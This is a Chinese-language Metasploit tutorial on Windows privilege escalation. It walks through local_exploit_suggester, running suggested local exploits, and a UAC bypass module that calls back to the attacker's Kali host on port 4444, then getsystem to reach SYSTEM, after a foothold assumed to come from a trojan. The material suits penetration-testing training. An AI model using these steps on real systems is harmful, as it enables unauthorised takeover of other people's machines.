## 核心操作流程概述

![](img/4aacdfe1121101c2f2b913e9f8ca98d9_12.png)

![](img/4aacdfe1121101c2f2b913e9f8ca98d9_14.png)

![](img/4aacdfe1121101c2f2b913e9f8ca98d9_15.png)

整个提权过程可以概括为以下几个核心步骤：
1.  获得一个初始的会话（Session），通常是普通用户权限。
2.  使用 `local_exploit_suggester` 模块自动检测目标系统可能存在的提权漏洞。
3.  根据检测结果，尝试使用推荐的漏洞利用模块。
4.  成功利用后，获得更高权限（如SYSTEM权限）的会话。

![](img/4aacdfe1121101c2f2b913e9f8ca98d9_16.png)

![](img/4aacdfe1121101c2f2b913e9f8ca98d9_18.png)

![](img/4aacdfe1121101c2f2b913e9f8ca98d9_19.png)

![](img/4aacdfe1121101c2f2b913e9f8ca98d9_20.png)

其核心逻辑可以用以下伪代码表示：
```bash
# 假设已获得会话 session_id
use post/multi/recon/local_exploit_suggester
set SESSION <session_id>
run
# 根据输出结果，尝试使用推荐的 exploit 模块
use <recommended_exploit_module>
set SESSION <session_id>
run
```

## 环境准备与初始会话

![](img/4aacdfe1121101c2f2b913e9f8ca98d9_35.png)

![](img/4aacdfe1121101c2f2b913e9f8ca98d9_37.png)

首先，我们需要模拟已经通过某种方式（例如木马程序）获得了一个目标机器的普通用户会话。在MSF中，这体现为一个有效的会话（Session）ID。

![](img/4aacdfe1121101c2f2b913e9f8ca98d9_39.png)

![](img/4aacdfe1121101c2f2b913e9f8ca98d9_41.png)

以下是查看当前会话的命令：
```bash
sessions -l
```
命令执行后，会列出所有活跃的会话。例如，我们可能获得一个ID为20的会话，其用户为普通用户 `win7`。

## 自动化漏洞检测

![](img/4aacdfe1121101c2f2b913e9f8ca98d9_48.png)

![](img/4aacdfe1121101c2f2b913e9f8ca98d9_49.png)

![](img/4aacdfe1121101c2f2b913e9f8ca98d9_51.png)

当获得普通用户会话后，我们可以使用MSF的 `local_exploit_suggester` 模块来扫描目标系统，寻找可能存在的本地提权漏洞。

以下是使用该模块的步骤：

1.  **加载模块**：在MSF控制台输入以下命令。
    ```bash
    use post/multi/recon/local_exploit_suggester
    ```

2.  **配置参数**：唯一必须设置的参数是 `SESSION`，即我们已获得的会话ID。
    ```bash
    set SESSION 20
    ```

![](img/4aacdfe1121101c2f2b913e9f8ca98d9_53.png)

3.  **执行检测**：运行模块，开始自动化扫描。
    ```bash
    run
    ```
    模块运行后，会基于当前会话的权限，在目标机器上检查已知的本地提权漏洞。扫描完成后，它会列出MSF中可用的、可能成功的漏洞利用模块。

![](img/4aacdfe1121101c2f2b913e9f8ca98d9_55.png)

![](img/4aacdfe1121101c2f2b913e9f8ca98d9_57.png)

## 尝试利用检测到的漏洞

![](img/4aacdfe1121101c2f2b913e9f8ca98d9_59.png)

`local_exploit_suggester` 模块的输出结果是一个参考列表。我们需要从中选择模块进行尝试。

![](img/4aacdfe1121101c2f2b913e9f8ca98d9_61.png)

![](img/4aacdfe1121101c2f2b913e9f8ca98d9_62.png)

以下是尝试利用漏洞的步骤：

1.  **选择模块**：从检测结果列表中，选择一个漏洞利用模块。例如，第一个推荐模块是 `exploit/windows/local/...`。
2.  **加载并配置**：使用该模块，并设置会话参数。
    ```bash
    use exploit/windows/local/[module_name]
    set SESSION 20
    ```
    *注意：部分模块可能需要设置其他参数，如 `LHOST`, `LPORT` 或 `TARGET`。可以使用 `show options` 命令查看所有可配置项。*
3.  **执行利用**：运行该漏洞利用模块。
    ```bash
    exploit
    ```
    如果利用成功，将会返回一个新的、具有更高权限的会话。

**重要提示**：自动化检测给出的模块只是“可能有效”，并非百分之百成功。实际操作中可能需要尝试多个模块。

![](img/4aacdfe1121101c2f2b913e9f8ca98d9_64.png)

## 处理特殊场景：绕过UAC

在某些情况下，即使当前用户属于管理员组，直接使用 `getsystem` 命令也无法提权。这时往往是因为用户账户控制（UAC）的限制。针对这种情况，MSF提供了专门的UAC绕过模块。

以下是使用UAC绕过模块的步骤：

![](img/4aacdfe1121101c2f2b913e9f8ca98d9_66.png)

1.  **加载UAC绕过模块**：例如，使用 `exploit/windows/local/bypassuac` 模块。
    ```bash
    use exploit/windows/local/bypassuac
    ```

![](img/4aacdfe1121101c2f2b913e9f8ca98d9_68.png)

2.  **配置参数**：设置当前会话（SESSION）、本地主机（LHOST）和端口（LPORT）。
    ```bash
    set SESSION 20
    set LHOST <你的Kali IP>
    set LPORT 4444
    ```
    *注意：需要根据目标系统架构（x86/x64）正确设置 `TARGET` 参数，否则会报错。*

![](img/4aacdfe1121101c2f2b913e9f8ca98d9_70.png)

3.  **执行绕过**：运行模块。
    ```bash
    exploit
    ```
    成功执行后，会获得一个新的会话。这个新会话已经绕过了UAC，拥有了更高的管理员令牌。在此新会话中，再执行 `getsystem` 命令，即可成功获得SYSTEM权限。

## 常见问题与排错

在操作过程中，可能会遇到各种错误。以下是一个常见的排错思路：

1.  **检查参数配置**：确保所有必填参数（如SESSION, LHOST, LPORT）都已正确设置。
2.  **注意系统架构**：如果遇到类似 `“x86 target selected for x64 system”` 的错误，说明模块的 `TARGET` 参数与目标系统架构不匹配。使用 `show targets` 查看可选目标，并使用 `set TARGET <id>` 进行设置。
3.  **查看错误信息**：MSF的报错信息（通常是红色文字）通常会明确指出问题所在，仔细阅读有助于快速定位问题。
